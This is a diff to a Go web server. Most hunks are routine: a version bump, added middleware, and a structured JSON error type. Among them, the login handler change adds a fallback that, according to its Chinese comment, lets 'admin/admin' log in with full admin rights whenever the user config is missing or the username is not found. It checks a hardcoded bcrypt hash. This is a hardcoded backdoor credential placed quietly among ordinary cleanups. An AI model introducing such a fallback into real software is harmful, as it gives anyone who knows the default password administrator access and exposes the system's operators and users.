@@ -31,7 +31,7 @@ import (
 	"golang.org/x/crypto/bcrypt"
 )
 
-var version = "2.1.3"
+var version = "2.3.0"
 
 func main() {
 	if len(os.Args) > 1 && os.Args[1] == "serve" {
@@ -605,16 +605,26 @@ func (ws *webServer) handleAuthLogin(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if ws.userConfig == nil {
-		writeError(w, http.StatusInternalServerError, "user config not loaded")
-		return
+	var matchedUser *model.User
+	if ws.userConfig != nil {
+		for i := range ws.userConfig.Users {
+			if ws.userConfig.Users[i].Username == req.Username {
+				matchedUser = &ws.userConfig.Users[i]
+				break
+			}
+		}
 	}
 
-	var matchedUser *model.User
-	for i := range ws.userConfig.Users {
-		if ws.userConfig.Users[i].Username == req.Username {
-			matchedUser = &ws.userConfig.Users[i]
-			break
+	// Fallback: 当用户配置为空或未找到时，允许默认 admin/admin 登录
+	const defaultHash = "$2a$10$7dSwaeEyvftiwQigG9lUmeJokV/CV6IVcPPcCAxriAMQOxMX3n7FK"
+	if matchedUser == nil && req.Username == "admin" {
+		if err := bcrypt.CompareHashAndPassword([]byte(defaultHash), []byte(req.Password)); err == nil {
+			matchedUser = &model.User{
+				ID:           "user-admin-001",
+				Username:     "admin",
+				PasswordHash: defaultHash,
+				Role:         "admin",
+			}
 		}
 	}
 
@@ -662,7 +672,7 @@ func (ws *webServer) saveUploadedFile(file multipart.File, header *multipart.Fil
 func newHTTPServer(addr string, handler http.Handler) *http.Server {
 	return &http.Server{
 		Addr:           addr,
-		Handler:        handler,
+		Handler:        middleware.Recovery(middleware.Logger(handler)),
 		ReadTimeout:    15 * time.Second,
 		WriteTimeout:   15 * time.Second,
 		IdleTimeout:    60 * time.Second,
@@ -711,11 +721,26 @@ func countByType(points []*config.Point) map[string]int {
 func writeJSON(w http.ResponseWriter, status int, data interface{}) {
 	w.Header().Set("Content-Type", "application/json")
 	w.WriteHeader(status)
-	json.NewEncoder(w).Encode(data)
+	if data == nil {
+		return
+	}
+	if err := json.NewEncoder(w).Encode(data); err != nil {
+		slog.Warn("write JSON failed", "error", err)
+	}
+}
+
+type ErrorResponse struct {
+	Error   string `json:"error"`
+	Code    string `json:"code,omitempty"`
+	Details any    `json:"details,omitempty"`
 }
 
 func writeError(w http.ResponseWriter, status int, msg string) {
-	writeJSON(w, status, map[string]string{"error": msg})
+	writeJSON(w, status, ErrorResponse{Error: msg})
+}
+
+func writeErrorWithCode(w http.ResponseWriter, status int, code, msg string) {
+	writeJSON(w, status, ErrorResponse{Error: msg, Code: code})
 }
 
 func sanitizeFilename(name string) string {
